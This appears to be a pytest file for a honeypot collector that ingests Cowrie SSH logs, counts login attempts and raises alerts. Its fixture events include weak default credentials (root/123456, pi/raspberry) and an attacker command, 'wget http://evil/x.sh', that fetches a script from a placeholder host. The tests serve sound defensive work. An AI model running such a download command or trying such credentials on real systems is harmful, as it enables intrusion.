"""Cowrie honeypot ingestion."""

from __future__ import annotations

import json

from pnma.collectors.honeypot import HoneypotCollector
from pnma.db import Database


def _cowrie_log(tmp_path, events):
    p = tmp_path / "cowrie.json"
    p.write_text("\n".join(json.dumps(e) for e in events) + "\n", encoding="utf-8")
    return p


def _events():
    return [
        {"eventid": "cowrie.session.connect", "src_ip": "45.9.1.2"},
        {"eventid": "cowrie.login.failed", "src_ip": "45.9.1.2", "username": "root", "password": "123456"},
        {"eventid": "cowrie.login.failed", "src_ip": "45.9.1.2", "username": "root", "password": "admin"},
        {"eventid": "cowrie.login.success", "src_ip": "45.9.1.2", "username": "root", "password": "root"},
        {"eventid": "cowrie.command.input", "src_ip": "45.9.1.2", "input": "wget http://evil/x.sh"},
        # a second, quieter source
        {"eventid": "cowrie.login.failed", "src_ip": "8.8.4.4", "username": "pi", "password": "raspberry"},
        # a malformed line's worth of garbage is exercised separately
    ]


def test_ingest_raises_one_alert_per_source(tmp_path):
    log = _cowrie_log(tmp_path, _events())
    db = Database(tmp_path / "pnma.db")
    hp = HoneypotCollector(db, "hp-1", str(log))
    summary = hp.run_once()
    assert summary["ok"] and summary["sources"] == 2

    alerts = db.query("SELECT * FROM alerts WHERE rule_id = 'honeypot_hit' ORDER BY src_ip"
                      if False else "SELECT * FROM alerts WHERE rule_id = 'honeypot_hit'")
    assert len(alerts) == 2
    busy = next(a for a in alerts if "45.9.1.2" in a["title"])
    # a successful login + a command run -> high
    assert busy["severity"] == "high"
    ev = json.loads(busy["evidence"])
    assert ev["successful_logins"] == 1
    assert "wget http://evil/x.sh" in ev["commands"]
    db.close()


def test_incremental_offset_does_not_realert(tmp_path):
    log = _cowrie_log(tmp_path, _events())
    db = Database(tmp_path / "pnma.db")
    hp = HoneypotCollector(db, "hp-1", str(log))
    hp.run_once()
    count1 = db.query_one("SELECT COUNT(*) n FROM alerts WHERE rule_id='honeypot_hit'")["n"]
    # second run with no new lines: no new alerts, counts unchanged
    hp.run_once()
    busy = db.query_one("SELECT count FROM alerts WHERE title LIKE '%45.9.1.2%'")
    assert busy["count"] == 1  # not bumped -- nothing new was read
    count2 = db.query_one("SELECT COUNT(*) n FROM alerts WHERE rule_id='honeypot_hit'")["n"]
    assert count1 == count2 == 2
    db.close()


def test_new_lines_after_first_read_are_picked_up(tmp_path):
    log = _cowrie_log(tmp_path, _events())
    db = Database(tmp_path / "pnma.db")
    hp = HoneypotCollector(db, "hp-1", str(log))
    hp.run_once()
    # append a fresh hit from the same source
    with log.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps({"eventid": "cowrie.login.failed", "src_ip": "45.9.1.2",
                             "username": "root", "password": "toor"}) + "\n")
    hp.run_once()
    busy = db.query_one("SELECT count FROM alerts WHERE title LIKE '%45.9.1.2%'")
    assert busy["count"] == 2  # bumped once by the second batch
    db.close()


def test_malformed_line_is_skipped(tmp_path):
    log = tmp_path / "cowrie.json"
    log.write_text(
        json.dumps({"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4", "username": "a", "password": "b"})
        + "\n{ this is not json }\n"
        + json.dumps({"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4", "username": "a", "password": "c"})
        + "\n",
        encoding="utf-8",
    )
    db = Database(tmp_path / "pnma.db")
    hp = HoneypotCollector(db, "hp-1", str(log))
    summary = hp.run_once()
    assert summary["ok"] and summary["logins"] == 2
    db.close()


def test_registers_a_honeypot_sensor(tmp_path):
    log = _cowrie_log(tmp_path, _events())
    db = Database(tmp_path / "pnma.db")
    HoneypotCollector(db, "hp-1", str(log)).run_once()
    s = db.query_one("SELECT kind FROM sensors WHERE sensor_id = 'hp-1'")
    assert s and s["kind"] == "honeypot"
    db.close()
